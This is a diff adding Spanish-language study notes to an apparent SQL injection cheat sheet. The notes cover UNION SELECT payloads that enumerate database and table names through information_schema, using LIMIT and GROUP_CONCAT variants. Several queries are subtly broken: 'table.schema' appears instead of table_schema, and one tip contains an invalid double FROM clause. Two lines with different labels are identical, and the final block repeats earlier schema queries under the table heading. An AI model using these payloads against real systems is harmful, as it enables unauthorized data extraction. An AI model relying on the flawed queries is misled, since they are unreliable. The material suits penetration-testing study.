@@ -137,4 +137,59 @@ SELECT username,password FROM users UNION SELECT 1,GROUP_CONCAT(schema_name) FRO
 SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;
 ````
 
+---
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+## `table_name`: Tables Names Enum
+
+#### `Union Select` + `schema_name`
+
+- `Recordatorio`: El `UNION SELECT` en ocasiones necesita de un `LIMIT` en caso que haya error en la visualización.
+
+````sql
+##     Tip: básicamente se inserta el basic query (SELECT table_name FROM information_schema.tables FROM database();) dentro de un UNION pero se le quita el SELECT para que no se duplique ;)
+##     OJO!!! Se pone el "WHERE table.schema = database()" [o el nombre de la base de datos] de lo contrario dumpea las ablas de TODAS las DB. 
+
+## Basic Union Select (v1) (Dumpeando todas las tablas de todas las DB)
+SELECT username,password FROM users UNION SELECT 1,table_name FROM information_schema.tables;
+## Basic Union Select (v1) (Dumpeando solo las tablas de database())
+SELECT username,password FROM users UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database();
+SELECT username,password FROM users UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = "Fz3r0_Corporations";
+
+## Condition Union Select (v2) (Todas las tablas de Todas las DB)
+SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database();
+## Condition Union Select (v2) (Solo tablas de determinada DB)
+SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database();
+SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database();
+
+## Condition Union Select (v2) + LIMIT:
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables LIMIT 0,1;
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables LIMIT 1,1;
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables LIMIT 2,1;
+
+
+````
+
+---
+
+#### `Group Concat` + `Union Select` + `schema_name`
+
+- `Recordatorio`: Group Concat no necesita `LIMIT` ya que se devuelve en una sola linea ;)
+
+````sql
+##     Tip: básicamente se inserta el query de union select un "GROUP_CONCAT" (GROUP CONCAT(schema_name)) dentro de un UNION pero se le quita el SELECT para que no se duplique ;)
+
+## Basic Union Select (v1)
+SELECT username,password FROM users UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;
+
+## Condition Union Select (v2):
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;
+````
 
